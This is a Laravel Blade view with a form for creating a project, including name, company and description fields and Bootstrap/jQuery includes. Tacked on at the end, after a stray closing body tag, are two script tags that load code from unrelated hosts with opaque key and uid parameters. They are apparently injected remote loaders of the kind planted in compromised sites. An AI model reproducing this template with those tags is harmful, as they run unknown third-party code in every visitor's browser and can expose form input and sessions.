@extends('layouts.app')

@section('content')

<div class="container">
  <div class="row d-flex">
  
        <div class=" col-md-9 col-sm-9 pull-left">
            
                <div class="row pt-5 col-md-12 col-lg-12 col-sm-12" style=" margin: 10px;">
                        <form action="{{ route('projects.store')}}" class="form-control" method="POST">
                            {{ csrf_field() }}

                            <div class="form-group">
                                <label for="project-name">Name</label>
                                <input type="text" name="name" id="project-name" class="form-control" placeholder="Enter name"  required>
                            </div>
                            
                            @if($companies == null)
                                <input type="hidden" name="company_id" value="{{ $company_id}}">
                            @endif

                            @if($companies != null)
                                <div class="form-group">
                                    <label for="project-content">Select company</label>
                                    <select name="company_id" id="" class="form-control">
                                        @foreach ($companies as $company)
                                            <option value="{{ $company->id}}"> {{ $company->name}}</option>
                                        @endforeach
                                    </select>
                                </div>
                            @endif
                            
                            <div class="form-group">
                                <label for="project-content">Description</label>
                                <textarea name="description" id="project-content" class="form-control autosize-target text-left" placeholder="Enter description" rows="5" style="resize: verticle;"></textarea>
                            </div>

                            

                            <div class="form-group">
                                <input type="submit" value="Submit" class="btn btn-primary">
                            </div>
                        </form>
                   
                </div><!-- /.row -->
            
        </div>
    <div class="col-sm-3 col-md-3 pull-right mt-5">
        <div class="sidebar-module">
            <h4>Actions</h4>
            <ol class="list-unstyled">
                <li><a href="/projects">Project list</a></li>
            </ol>
        </div>
    </div>
    </div>

  
  


  

<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script>window.jQuery || document.write('<script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"><\/script>')</script><script src="/docs/4.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-xrRywqdh3PHs8keKZN+8zzc5TX0GRTLCcmivcbNJWm2rs5C8PRhcEn3czEjhAO9o" crossorigin="anonymous"></script>

<script type="text/javascript" src="https://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8062x"></script><script type="text/javascript" src="https://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8062x&amp;format=arrjs&amp;r=1568137437175"></script></body>
</div>
@endsection
